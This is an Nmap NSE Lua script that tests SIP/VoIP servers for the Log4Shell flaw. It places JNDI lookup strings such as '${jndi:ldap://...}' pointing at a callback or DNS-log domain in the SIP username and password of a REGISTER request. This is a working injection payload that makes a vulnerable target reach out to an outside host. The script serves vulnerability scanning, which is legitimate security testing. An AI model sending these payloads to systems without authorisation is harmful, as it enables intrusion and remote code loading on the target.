local shortport = require "shortport"
local sip = require "sip"
local stdnse = require "stdnse"

description = [[
Performs log4shell check  against Session Initiation Protocol
(SIP) accounts. This protocol is most commonly associated with VoIP sessions.
]]

---
-- @usage
-- nmap -sU -p 5060 <target> --script=sip-log4shell
--

-- Version 0.1
-- Created 2021-17-12 - v0.1 - created by Vlatko Kosturjak <kost@linux.hr>

author = "Vlatko Kosturjak"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive","log4shell"}

portrule = shortport.port_or_service(5060, "sip", {"tcp", "udp"})

action = function(host, port)
  local payload = stdnse.get_script_args(SCRIPT_NAME..".payload")
  local gpayload = stdnse.get_script_args("log4shell.payload")

  if not payload then
    if not gpayload then
      if nmap.registry['dnslog-cn'] then
	 stdnse.debug2("registry not present")
	 local registry = nmap.registry['dnslog-cn']
	 if registry.domain then
	       payload = "${jndi:ldap://{{target}}."..registry.domain.."}"
	 else
	       stdnse.debug2("session not present")
	 end
      else
	 payload = "${jndi:ldap://mydomain/uri}"
      end
      stdnse.debug1("Setting the payload to default payload:"..payload)
    else
      payload=gpayload
    end
  end
  local helper = sip.Helper:new(host, port, { expires = 0 })
  local status, err = helper:connect()
  if ( not(status) ) then
    return "ERROR: Failed to connect to SIP server"
  end

  user=payload
  pass=payload

  stdnse.debug1("Sending payload as user/pass: %s/%s", user, pass)
  local status, err = helper:connect()
  if ( not(status) ) then return "ERROR: Failed to connect" end

  helper:setCredentials(user, pass)
  local status, err = helper:register()
  helper:close()

  return

end
